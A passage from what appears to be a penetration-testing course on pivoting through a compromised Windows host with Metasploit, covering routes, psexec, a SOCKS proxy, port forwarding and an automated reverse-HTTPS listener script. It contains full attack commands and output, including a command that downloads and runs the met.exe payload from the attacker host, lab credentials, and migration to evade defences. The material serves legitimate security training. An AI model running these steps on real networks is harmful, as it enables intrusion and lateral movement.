IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.5.0         255.255.255.0      Session 12

[*] There are currently no IPv6 routes defined.
```

With a path created to the internal network, we can enumerate this subnet. Now we could scan the whole network for live hosts with a port scan auxiliary module. Since this scan would take quite some time to complete, let's shorten this step by only scanning the other live host in the second network. Therefore, instead of setting the value of RHOSTS to 172.16.5.0/24 as we would do if we wanted to scan the whole network, we set it to 172.16.5.200. For now, we only want to scan ports 445 and 3389.

```bash
msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp 

msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.5.200
RHOSTS => 172.16.5.200

msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
PORTS => 445,3389

msf6 auxiliary(scanner/portscan/tcp) > run

[+] 172.16.5.200:         - 172.16.5.200:445 - TCP OPEN
[+] 172.16.5.200:         - 172.16.5.200:3389 - TCP OPEN
[*] 172.16.5.200:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

172.161.5.200 has ports 445 and 3389 open. Let's use two modules for SMB and RDP using our pivot host ITWK01 to perform operations on the target.

First, we'll attempt to use the psexec1 module to get access on the second target as user luiza. In the previous section, we retrieved the NTLM hash via Kiwi. Let's assume we could successfully crack the NTLM hash and the clear-text password is BoccieDearAeroMeow1!. For psexec to succeed, luiza has to be a local administrator on the second machine. For this example, let's also assume that we confirmed this through information gathering techniques.

Let's use exploit/windows/smb/psexec and set SMBUser to luiza, SMBPass to BoccieDearAeroMeow1!, and RHOSTS to 172.16.5.200.

It's important to note that the added route will only work with established connections. Because of this, the new shell on the target must be a bind shell such as windows/x64/meterpreter/bind_tcp, thus allowing us to use the set route to connect to it. A reverse shell payload would not be able to find its way back to our attacking system in most situations because the target does not have a route defined for our network.

```bash
msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > set SMBUser luiza
SMBUser => luiza

msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
SMBPass => BoccieDearAeroMeow1!

msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.5.200
RHOSTS => 172.16.5.200

msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp

msf6 exploit(windows/smb/psexec) > set LPORT 8000
LPORT => 8000
```

Now that all options are set, we can launch the module.

```bash
msf6 exploit(windows/smb/psexec) > run

[*] 172.16.5.200:445 - Connecting to the server...
[*] 172.16.5.200:445 - Authenticating to 172.16.5.200:445|ITWK02 as user 'luiza'...
[*] 172.16.5.200:445 - Selecting PowerShell target
[*] 172.16.5.200:445 - Executing the payload...
[+] 172.16.5.200:445 - Service start timed out, OK if running a command or non-service executable...
[*] Started bind TCP handler against 172.16.5.200:8000
[*] Sending stage (200774 bytes) to 172.16.5.200
[*] Meterpreter session 13 opened (172.16.5.199:51785 -> 172.16.5.200:8000 via session 12) at 2022-08-05 07:06:43 -0400

meterpreter > 
```

We successfully used the psexec exploit module to obtain a Meterpreter shell on the second target via the compromised machine.

As an alternative to adding routes manually, we can use the autoroute post-exploitation module to set up pivot routes through an existing Meterpreter session automatically. To demonstrate the usage of this module, we first need to remove the route we set manually. Let's terminate the Meterpreter session created through the psexec module and remove all routes with route flush.

Now the only session left is the Meterpreter session created by executing met.exe as user luiza. In addition, the result of route print states that there are no routes defined. Next, let's activate the module multi/manage/autoroute in which we have to set the session ID as value for the option SESSION. Then, let's enter run to launch the module.

```bash
msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute

msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

msf6 post(multi/manage/autoroute) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  12         meterpreter x64/windows  ITWK01\luiza @ ITWK01  192.168.119.4:443 -> 127.0.0.1 ()


msf6 post(multi/manage/autoroute) > set session 12
session => 12

msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against ITWK01
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.5.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.50.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```

autoroute added 172.16.5.0/24 to the routing table.

We could now use the psexec module as we did before, but we can also combine routes with the server/socks_proxy auxiliary module to configure a SOCKS2 proxy. This allows applications outside of the Metasploit Framework to tunnel through the pivot on port 1080 by default. We set the option SRVHOST to 127.0.0.1 and VERSION to 5 in order to use SOCKS version 5.

```bash
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy 

msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server
```

We can now update our proxychains configuration file (/etc/proxychains4.conf) to take advantage of the SOCKS5 proxy.

After editing the configuration file, it should appear as follows:

```bash
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

Finally, we can use proxychains to run xfreerdp to obtain GUI access from our Kali Linux system to the target machine on the internal network.

```bash
kali@kali:~$ sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.5.200:3389  ...  OK
...
Certificate details for 172.16.5.200:3389 (RDP-Server):
        Common Name: itwk02
        Subject:     CN = itwk02
        Issuer:      CN = itwk02
        Thumbprint:  4b:ef:ec:bb:96:7d:03:01:53:f3:03:de:8b:39:51:a9:bb:3f:1b:b2:70:83:08:fc:a7:9a:ec:bb:e7:ed:98:36
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
Password:
```

The xfreerdp client opens a new window providing us access to the GUI of ITWK02 in the internal network via RDP.

We can also use a similar technique for port forwarding using the portfwd command from inside a Meterpreter session, which will forward a specific port to the internal network.

```bash
msf6 auxiliary(server/socks_proxy) > sessions -i 12
[*] Starting interaction with 5...

meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]

OPTIONS:

    -h   Help banner.
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.
```

We can create a port forward from localhost port 3389 to port 3389 on the target host (172.16.5.200).

```bash
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200
[*] Local TCP relay created: :3389 <-> 172.16.5.200:3389
```

Let's test this by connecting to 127.0.0.1:3389 with xfreerdp to access the compromised host in the internal network.

```bash
kali@kali:~$ sudo xfreerdp /v:127.0.0.1 /u:luiza             
[08:09:25:307] [1314360:1314361] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[08:09:25:307] [1314360:1314361] [WARN][com.freerdp.crypto] - CN = itwk02
...
```

Using this technique, we are able to gain a remote desktop session on a host we were otherwise not able to reach from our Kali system. Likewise, if the second target machine was connected to an additional network, we could create a chain of pivots to reach further hosts.

In this section, we explored various methods and modules to pivot within Metasploit. We learned how to manually and automatically set routes through existing sessions and interact with systems reachable by these routes. Then, we leveraged the socks_proxy module to create a SOCKS proxy to reach the second target machine with proxychains. Finally, we used the Meterpreter command portfwd to forward ports.

### Automating Metasploit

Resource scripts can chain together a series of Metasploit console commands and Ruby code. Meaning, we can either use the built-in commands of Metasploit or write code in Ruby1 (as it's the language Metasploit is developed in) to manage control flow as well as develop advanced logic components for resource scripts.

In a penetration test, we may need to set up several multi/handler listeners each time we want to receive an incoming reverse shell. We could either let Metasploit run in the background the whole time or start Metasploit and manually set up a listener each time. We could also create a resource script to automate this task for us.

Let's create a resource script that starts a multi/handler listener for a non-staged Windows 64-bit Meterpreter payload. To do this, we can create a file in the home directory of the user kali named listener.rc and open it in an editor such as Mousepad.2

We first need to think about the sequence of the commands we want to execute. For this example, the first command is to activate the multi/handler module. Then, we set the payload, which in our case, is windows/meterpreter_reverse_https. Next, we can set the LHOST and LPORT options to fit our needs.

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
```

In addition, we can configure the AutoRunScript option to automatically execute a module after a session was created. For this example, let's use the post/windows/manage/migrate module. This will cause the spawned Meterpreter to automatically launch a background notepad.exe process and migrate to it. Automating process migration helps to avoid situations where our payload is killed prematurely either by defensive mechanisms or the termination of the related process.

```bash
set AutoRunScript post/windows/manage/migrate 
```

Let's also set ExitOnSession to false to ensure that the listener keeps accepting new connections after a session is created.

```bash
set ExitOnSession false
```

We can also configure advanced options such as ExitOnSession in multi/handler and AutoRunScript in payloads by using show advanced within the activated module or selected payload.

Finally, we'll add run with the arguments -z and -j to run it as a job in the background and to stop us from automatically interacting with the session.

```bash
run -z -j
```

Now, let's save the script and start Metasploit by entering msfconsole with the resource script as argument for -r.

```bash
kali@kali:~$ sudo msfconsole -r listener.rc
[sudo] password for kali:
...

[*] Processing listener.rc for ERB directives.
resource (listener.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (listener.rc)> set PAYLOAD windows/meterpreter/reverse_https
PAYLOAD => windows/meterpreter/reverse_https
resource (listener.rc)> set LHOST 192.168.119.4
LHOST => 192.168.119.4
resource (listener.rc)> set LPORT 443
LPORT => 443
resource (listener.rc)> set AutoRunScript post/windows/manage/migrate
AutoRunScript => post/windows/manage/migrate
resource (listener.rc)> set ExitOnSession false
ExitOnSession => false
resource (listener.rc)> run -z -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started HTTPS reverse handler on https://192.168.119.4:443
```

All of our commands were executed as specified in the script.

Let's connect to the BRUTE2 machine via RDP with user justin and password SuperS3cure1337#, start PowerShell, download the malicious Windows executable met.exe that we already used in previous sections, and execute it.

```bash
PS C:\Users\justin> iwr -uri http://192.168.119.4/met.exe -Outfile met.exe

PS C:\Users\justin> .\met.exe
```

Once met.exe gets executed, Metasploit notifies us about the incoming connection.

```bash
[*] Started HTTPS reverse handler on https://192.168.119.4:443
[*] https://192.168.119.4:443 handling request from 192.168.50.202; (UUID: rdhcxgcu) Redirecting stageless connection from /dkFg_HAPAAB9KHwqH8FRrAG1_y2iZHe4AJlyWjYMllNXBbFbYBVD2rlxUUDdTrFO7T2gg6ma5cI-GahhqTK9hwtqZvo9KJupBG7GYBlYyda_rDHTZ1aNMzcUn1x with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'
[*] https://192.168.119.4:443 handling request from 192.168.50.202; (UUID: rdhcxgcu) Attaching orphaned/stageless session...
[*] Session ID 1 (192.168.119.4:443 -> 127.0.0.1) processing AutoRunScript 'post/windows/manage/migrate'
[*] Running module against BRUTE2
[*] Current server process: met.exe (2004)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 5340
[+] Successfully migrated into process 5340
[*] Meterpreter session 1 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-02 09:54:32 -0400
```

There are resource scripts provided for port scanning, brute forcing, protocol enumerations, and so on. Before we attempt to use them, we should thoroughly examine, understand, and modify them to fit our needs.

Some of these scripts use the global datastore of Metasploit to set options such as RHOSTS. When we use set or unset, we define options in the context of a running module. However, we can also define values for options across all modules by setting global options. These options can be set with setg and unset with unsetg.3

Resource scripts can be quite handy to automate parts of a penetration test. We can create a set of resource scripts for repetitive tasks and operations. We can prepare those scripts and then modify them for each penetration test. For example, we could prepare resource scripts for listeners, pivoting, post-exploitation, and much more. Using them on multiple penetration tests can save us a lot of time.

Let's summarize what we learned in this section. We began by getting familiar with resource scripts. Then, we created our own resource script to automate the setup process of a multi/handler listener. Finally, we executed the resource script and a corresponding executable file to receive an incoming Meterpreter reverse shell, which migrated itself to a newly spawned Notepad process.